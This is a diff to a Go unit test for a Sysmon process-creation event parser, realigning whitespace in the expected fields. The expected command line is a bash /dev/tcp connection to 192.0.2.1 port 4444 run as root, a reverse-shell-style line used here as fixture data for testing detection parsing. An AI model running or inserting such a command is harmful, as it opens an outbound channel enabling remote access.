@@ -33,13 +33,13 @@ func TestSysmonParsesProcessCreate(t *testing.T) {
 	}
 	e := evs[0]
 	checks := map[string]struct{ got, want string }{
-		"Source":           {e.Source, "sysmon"},
-		"Image":            {e.Image, "/usr/bin/timeout"},
-		"CommandLine":      {e.CommandLine, "timeout 1 bash -c exec 3<>/dev/tcp/192.0.2.1/4444"},
-		"ParentImage":      {e.ParentImage, "/usr/bin/bash"},
-		"CurrentDirectory": {e.CurrentDirectory, "/root"},
-		"User":             {e.User, "root"},
-		"EventID":          {e.Raw["EventID"], "1"},
+		"Source":            {e.Source, "sysmon"},
+		"Image":             {e.Image, "/usr/bin/timeout"},
+		"CommandLine":       {e.CommandLine, "timeout 1 bash -c exec 3<>/dev/tcp/192.0.2.1/4444"},
+		"ParentImage":       {e.ParentImage, "/usr/bin/bash"},
+		"CurrentDirectory":  {e.CurrentDirectory, "/root"},
+		"User":              {e.User, "root"},
+		"EventID":           {e.Raw["EventID"], "1"},
 		"ParentCommandLine": {e.Raw["ParentCommandLine"], "bash"},
 	}
 	for name, c := range checks {
